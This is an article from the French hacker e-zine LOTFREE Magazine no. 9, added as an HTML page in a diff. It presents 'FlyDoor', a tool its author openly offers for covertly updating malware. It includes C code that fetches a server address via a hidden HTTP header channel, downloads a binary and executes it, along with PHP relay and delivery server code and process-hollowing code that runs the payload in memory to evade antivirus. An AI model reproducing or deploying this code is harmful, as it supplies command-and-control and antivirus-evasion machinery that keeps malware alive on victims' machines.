@@ -1,0 +1,285 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>LOTFREE9</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <link href="css/shCore.css" rel="stylesheet" type="text/css" />
+    <link href="css/shThemeDefault.css" rel="stylesheet" type="text/css" />
+  </head>
+
+  <body>
+    <div id="head">LOTFREE Magazine numéro 9</div>
+    <div id="foot"><span style="float: left;"><br />Lancez la radio, cliquez ici : </span><a href="#" onclick="window.open('player.html', 'Player', 'toolbar=0,status=0,location=0,menubar=0,resizable=0,width=175,height=35')"><img src="icon.png" /></a></div>
+    <div id="left">
+      <dl>
+        <dt><strong>Welcome to your inbox Hacker !</strong></dt>
+        <dd>Directories :</dd>
+        <dt><a id="inbox" class="nav" href="inbox.html"> Inbox</a></dt>
+        <dd>One for the money</dd>
+        <dt><a id="drafts" class="nav" href="drafts.html">Drafts</a></dt>
+        <dd>Two for the show</dd>
+        <dt><a id="sent" class="nav" href="sent.html">Sent</a></dt>
+        <dd>Three to get ready</dd>
+        <dt><a id="spam" class="nav" href="spam.html">Spam</a></dt>
+        <dd>And four to go</dd>
+        <dt><a id="trash" class="nav" href="trash.html">Trash</a></dt>
+        <dd>Enjoy ;-)</dd>
+      </dl>
+    </div>
+
+    <div id="content">
+    <h2>FlyDoor : un système de mise à jour siliencieuses de logiciel</h2>
+    <p><strong>Introduction</strong></p>
+    <p>Chers lecteurs, bonjour. Je vais aujourd'hui vous présenter le principe du logiciel <em>FlyDoor</em>. L'idée m'est venue à l'esprit après avoir lu un article sur le logiciel <a href="http://fr.wikipedia.org/wiki/LOIC">LOIC</a> (permettant de faire des DoS).</p>
+
+    <p>Aujourd'hui nous connaissons tous le principe de l'auto-update qui permet la mise à jour de logiciels de manière automatisée. Ces petits programmes vous permettent d'avoir des logiciels toujours à jour et de corriger d'éventuels bugs.</p>
+
+    <p>Il m'est donc venu à l'idée d'appliquer la même méthode pour nos chers petits malwares. En effet, aujourd'hui de nombreux malwares sont des logiciels à part entière, avec leur part de bugs et d'améliorations possibles.</p>
+
+    <p>J'ai donc réalisé un programme permettant la mise à jour automatisée de vos logiciels de la manière la plus discrète possible. Voici le schéma de principe.</p>
+
+    <p><strong>Schéma de principe</strong></p>
+    <p><img src="../data/flydoor/img.jpg" alt="Schema de principe client / serveur mandataire / serveur de mise à jour" /></p>
+
+    <p>L'idée étant que le programme devra être capable de résister à une tentative de suppression du système de mise à jour. Pour cela je me suis inspiré du système des trackers du réseau torrent. En effet le programme va, dans un premier temps, récupérer auprès du serveur mandataire, l'adresse du serveur de mise à jour. Suite à cela il va vérifier que le fichier disponible sur le serveur est plus récent que l'actuel (à l'aide d'un CRC32), le télécharger et le lancer le cas échéant. Tout cela camouflé à l'aide d'un covert channel HTTP (voir <a href="#ref1">[1]</a>, <a href="#ref2">[2]</a>)</p>
+
+    <p>Voici donc le processus décrit en entier :</p>
+
+    <ol>
+      <li>Requête HTTP POST au serveur mandataire pour récupérer le serveur de téléchargement.</li>
+      <li>Requête HTTP POST au serveur de téléchargement pour récupérer le hash du nouveau fichier.</li>
+      <li>Vérification du hash du nouveau fichier par rapport à celui présent sur la machine locale.</li>
+      <li>Téléchargement de la mise à jour par requête HTTP GET et vérification de l'intégrité du fichier.</li>
+      <li>Lancement de la mise à jour.</li>
+    </ol>
+
+    <p>L'utilisation du programme sera donc de la forme suivante :</p>
+    <pre class="brush: bash">FlyDoor –mandatory-server=http://mandatory-server.com/backdoor.php</pre>
+    <p>Où backdoor.php renverra via un tunnel caché l'adresse où télécharger la mise à jour du malware.</p>
+
+    <p><strong>Programmation</strong></p>
+
+    <p>Maintenant que nous avons l'architecture de notre application, il ne reste plus qu'à la coder \o/.</p>
+    <p>Nous pouvons tout de suite voir que nous avons un nombre important de requêtes HTTP à réaliser, ce qui nous amène à choisir la librairie <em>curl</em> <a href="#ref3">[3]</a> pour nous faciliter la tâche.</p>
+    <p>De plus j'ai choisi de transmettre les données par le biais de l'en-tête HTTP sous la forme d'un &quot;pseudo&quot; canal caché. Il nous faudra aussi une librairie permettant d'utiliser les expressions régulières pour parser les en-têtes. Nous prendrons alors <em>pcre</em> <a href="#ref4">[4]</a> qui est une référence.</p>
+    <p>Pour finir, nous aurons également besoin de parser les arguments passés au programme. Pour cela j'ai opté pour <em>argtable</em> <a href="#ref5">[5]</a>. Cette librairie est plus simple à utiliser que <em>getopt</em> et est largement suffisante pour l'utilisation que l'on souhaite en faire.</p>
+
+    <p><strong>Le côté client</strong></p>
+    <p>Dans un premier temps on va initialiser la librairie curl :</p>
+
+    <pre class="brush: cpp">CURL *curl;
+CURLcode res;
+
+curl = curl_easy_init();</pre>
+
+    <p>Je ne vais pas refaire un tutoriel sur l'utilisation de la librairie <em>curl</em> <a href="#ref3">[3]</a>, je vous renvoie pour cela à la documentation de la librairie. Ce qu'il faut savoir c'est que la majorité des commandes se font par le biais de la fonction <em>curl_easy_setopt</em>.</p>
+
+    <p>Après initialisation, nous allons donc récupérer l'adresse du serveur de mise à jour :</p>
+
+    <pre class="brush: cpp">if(curl) {
+  curl_easy_setopt(curl, CURLOPT_URL, MANDATORYSERVER);
+  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, &quot;name=110a3755713adadcc2b9f3301c12d358&quot;);
+  curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, get_server);
+
+  res = curl_easy_perform(curl); 
+}</pre>
+
+  <p>Ce code définit que nous envoyons une requête POST à MANDATORYSERVER avec comme argument <em>name</em> et en valeur le hash de &quot;<em>getbubbles</em>&quot;. Nous définissons également que la fonction <em>get_server</em> doit effectuer le traitement de l'header HTTP reçu en réponse. Le prototype de la fonction est le suivant :</p>
+  
+  <pre class="brush: cpp">static size_t get_server(void* ptr, size_t size, size_t nmemb, void* userdata)</pre>
+
+  <p>Il s'agit du prototype générique pour la majorité des handler de la libcurl. L'argument <em>ptr</em> contient les données reçues, <em>size</em>, la taille des données, <em>nmemb</em>, la taille du type de données et <em>userdata</em> permet de passer des arguments supplémentaires. Dans notre cas, cette fonction fait appel à <em>get_data</em> qui s'occupe de parser le header HTTP. J'ai choisi d'utiliser l'entête <em>X-Data</em> pour transmettre les données. Voici un exemple :</p>
+
+  <pre class="brush: plain">&lt; HTTP/1.1 200 OK
+&lt; Date: Tue, 12 Apr 2011 21:36:51 GMT
+&lt; Server: Apache/1.3.34 (Ubuntu)
+&lt; X-Powered-By: PHP/4.4.9-1.standard
+&lt; <strong>X-Data: 4884da7754823b44ccc2b2106f21146e</strong>
+&lt; Transfer-Encoding: chunked
+&lt; Content-Type: text/html</pre>
+
+<p>Il nous faut ensuite parser notre header pour récupérer les informations intéressantes.<br />
+Ainsi donc la fonction <em>get_data</em> s'occupe de récupérer l'adresse du serveur de mise à jour pour l'exemple précédent. Voici le code de la routine en question.</p>
+
+<pre class="brush: cpp">#define PATTERN &quot;(X-Data:) (.+)$&quot;
+re = pcre_compile(pattern,
+                  0,
+                  &amp;error,
+                  &amp;erroffset,
+                  NULL);
+if (re != NULL)
+{
+  rc = pcre_exec(re,
+                 NULL, 
+                 line,
+                 size * nmemb,
+                 0,
+                 0,
+                 ovector,
+                 OVECCOUNT);
+  if (rc &gt; 0)
+  {
+    int i = 2;
+    char *substring_start = line + ovector[2*i];
+    int substring_length = ovector[2*i+1] - ovector[2*i];
+    strncpy_s(to, 512, substring_start, substring_length);
+    pcre_free(re);
+  }
+}</pre>
+
+<p>Pour cette partie nous utilisons donc la librairie pcre. On peut voir que l'expression régulière chargée de récupérer les données est extrêmement simple, elle récupère tout ce qui suit le champ <em>X-Data</em>. Bien sûr libre à l'utilisateur de la modifier \o/. Cette feature sera intégrée dans une nouvelle version.</p>
+<p>Dans notre exemple nous récupérons dans un premier temps l'adresse du serveur de mise à jour. Ensuite nous interrogeons le serveur pour obtenir le nom et le hash de la mise à jour. Cela se fait grâce à une requête POST avec comme paramètre <em>name</em> et comme valeur le MD5 de la commande &quot;<em>getfile</em>&quot; et de la commande &quot;<em>getcrc32</em>&quot;.</p>
+
+<pre class="brush: cpp">// commande name = getfile
+curl_easy_setopt(curl, CURLOPT_POSTFIELDS, &quot;name=b24ba6d783f2aa471b9472109a5ec0ee&quot;);
+curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, get_filename);</pre>
+
+<p>Suivi de :</p>
+
+<pre class="brush: cpp">// commande name = getsum
+curl_easy_setopt(curl, CURLOPT_POSTFIELDS, &quot;name=9ea01aea19194742b87d3663a3be06af&quot;);
+curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, get_crc32);</pre>
+
+<p>Si ce hash est différent du fichier local, alors on récupère le fichier par une méthode GET :</p>
+<pre class="brush: cpp">FILE *fp;
+
+if(curl)
+{
+  fp = fopen(output, &quot;wb&quot;);
+  curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
+  curl_easy_setopt(curl, CURLOPT_URL, tmp);
+  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
+  curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+  res = curl_easy_perform(curl);
+  fclose(fp);
+}</pre>
+
+<p>Une fois le fichier récupéré, on l'exécute avec les arguments passés à notre utilitaire :</p>
+<pre class="brush: cpp">_execv(update_filename, argv);</pre>
+
+<p>Et voilà \o/ la mise à jour a été réalisée avec succès. Vous pouvez enfin nettoyer toutes les ressources allouées pendant l'exécution du programme.</p>
+
+<p><strong>Le côté serveur</strong></p>
+
+<p>Ceci étant pour le code côté client. Du côté serveur nous avons donc besoin d'un serveur HTTP. Dans notre exemple, un serveur Apache. Mais n'importe quel serveur permettant de faire tourner du PHP peut faire l'affaire. Je vais donc vous présenter le code PHP du serveur tel que je l'ai réalisé.</p>
+
+<p>Le serveur mandataire s'occupe de vérifier que les serveurs de mise à jour sont en ligne et renvoie le premier serveur fonctionnel de la liste :</p>
+
+<pre class="brush: php">&lt;?php
+$adresses = array(&quot;http://first-mirror:80/delivery.php&quot;,
+                  &quot;http://second-mirror:8080/delivery.asp&quot;);
+
+if ($_POST[&quot;name&quot;] == md5(&quot;getbubbles&quot;))
+{ 
+  foreach($adresses as $adresse)
+  {
+    if(@file_get_contents($adresse))
+    {
+      header(&quot;X-Data: http://&quot;.$adresse.'/');
+      break;
+    }
+  }
+}
+?&gt;</pre>
+
+<p>Du côté du serveur de mise à jour, le code est extrêmement simple puisqu'il s'occupe de retourner le nom du fichier de mise à jour et sa somme CRC32 :</p>
+
+<pre class="brush: php">&lt;?php
+$backdoor = &quot;http://127.0.0.1:80/test/update.exe&quot;;
+
+$crc32 = sprintf( &quot;%u&quot;, crc32(file_get_contents($backdoor)));
+
+if (isset($_POST[&quot;name&quot;]))
+{
+  if ($_POST[&quot;name&quot;] == md5(&quot;getfile&quot;))
+    header(&quot;X-Data: &quot;.$backdoor);
+  if ($_POST[&quot;name&quot;] == md5(&quot;getsum&quot;))
+    header(&quot;X-Data: &quot;.$crc32 );
+}
+
+?&gt;</pre>
+
+<p><strong>Exécution en mémoire</strong></p>
+
+<p>La première version de <em>FlyDoor</em> intégrait simplement l'exécution de l'update depuis le disque dur mais depuis la version 2, l'exécution du fichier en mémoire a été intégrée. Cette fonctionnalité consiste à copier le fichier téléchargé directement en RAM au lieu de le copier sur le disque pour ne pas attirer l'attention des antivirus.</p>
+<p>L'inconvénient de cette fonctionnalité est qu'il faut disposer des droits administrateur sur Windows Vista et plus récent du fait de l'utilisation de la fonction <em>WriteProcessMemory</em>.</p>
+
+<p>Le principe de fonctionnement est assez basique même s'il faut des connaissances concernant le format PE <a href="#ref6">[6]</a>. Dans un premier temps on copie le fichier en mémoire. Ensuite on lance son exécution en mode pause. Puis, voici la partie la plus importante, on réaligne le header grâce à la nouvelle adresse de base de notre exécutable. Et enfin on résume (on fait reprendre) notre process.</p>
+<p>Ci-dessous le code correspondant à cette partie, pour plus d'informations allez voir les sources sur le repository Google Code <a href="#ref7">[7]</a>.</p>
+
+<pre class="brush: cpp">if(CreateProcess(NULL,
+                  (LPWSTR)pPath,
+                  &amp;secAttrib,
+                  &amp;secAttrib,
+                  0,
+                  CREATE_SUSPENDED,
+                  NULL,
+                  NULL,
+                  &amp;peStartUpInformation,
+                  &amp;peProcessInformation))
+{
+    pContext.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(peProcessInformation.hThread,&amp;pContext);
+
+    VirtualProtectEx(peProcessInformation.hProcess,
+                     (void*)((DWORD)INH.OptionalHeader.ImageBase),
+                     dwImageSize,
+                     PAGE_EXECUTE_READWRITE,
+                     &amp;previousProtection);
+
+    WriteProcessMemory(peProcessInformation.hProcess,
+                       (void*)((DWORD)INH.OptionalHeader.ImageBase),
+                       pMemory,dwImageSize,&amp;dwWritten) );
+
+    WriteProcessMemory(peProcessInformation.hProcess,
+                       (void*)((DWORD)pContext.Ebx + 8),
+                       &amp;INH.OptionalHeader.ImageBase,
+                       4,
+                       &amp;dwWritten));
+
+    pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
+
+    SetThreadContext(peProcessInformation.hThread,&amp;pContext) );
+
+    VirtualProtectEx(peProcessInformation.hProcess,
+                     (void*)((DWORD)INH.OptionalHeader.ImageBase),
+                     dwImageSize,
+                     previousProtection,
+                     0);
+
+    ResumeThread(peProcessInformation.hThread);
+}</pre>
+
+<p><strong>Conclusion</strong></p>
+
+<p>Pour le moment seul un covert channel HTTP a été implémenté mais on pourrait imaginer d'autres types de covert channel (DNS, ICMP ou autres). La possibilité de modifier le format du covert channel par une personnalisation de l'expression régulière. De plus le code reste à améliorer, pour le moment de nombreux cas d'erreurs ne sont pas gérés mais toute aide extérieure sera appréciée \o/.</p>
+
+<p>Voilà, j'espère que cette présentation vous aura permis d'apprendre pas mal de choses. Je me permets maintenant de lancer un appel à la communauté : j'ai créé un hébergement google code pour le projet et j'espère que vous prendrez le temps d'y jeter un œil voir même d'y participer \o/.</p>
+
+<p>Vous pouvez accéder au projet à l'adresse : <a href="http://code.google.com/p/flydoor/">http://code.google.com/p/flydoor/</a></p>
+
+<p><strong>Bibliographie</strong></p>
+
+<p><a name="ref1">[1]</a> <a href="http://www.flyers-web.org/blog/index.php/securite-informatique">Frenchy Covert Channel</a>, <em>Flyers</em><br />
+<a name="ref2">[2]</a> <a href="http://gray-world.net/projects/papers/html/covert_paper_fr.html">Tunneling et canaux cachés au sein du protocole HTTP</a>, <em>Simon Castro</em><br />
+<a name="ref3">[3]</a> <a href="http://curl.haxx.se/libcurl/">Libcurl</a><br />
+<a name="ref4">[4]</a> <a href="http://www.pcre.org/">Libpcre</a><br />
+<a name="ref5">[5]</a> <a href="http://argtable.sf.net/">Argtable</a><br />
+<a name="ref6">[6]</a> <a href="http://asmongueur.free.fr/Officiel/Format%20Fichier/pefile.txt">PE format</a><br />
+<a name="ref7">[7]</a> <a href="http://code.google.com/p/flydoor/">FlyDoor</a></p>
+
+<p>Vous pouvez retrouver les sources en ligne <a href="http://code.google.com/p/flydoor/source/browse/#svn%2Ftrunk%2Fflydoor">sur le SVN du projet</a>.</p>
+
+    </div>
+<script language="javascript" src="js/shCore.js"></script>
+<script language="javascript" src="js/shBrushBash.js"></script>
+<script language="javascript" src="js/shBrushPlain.js"></script>
+<script language="javascript" src="js/shBrushPhp.js"></script>
+<script language="javascript" src="js/shBrushCpp.js"></script>
+<script type="text/javascript">
+  SyntaxHighlighter.all()
+</script>
+  </body>
+</html>
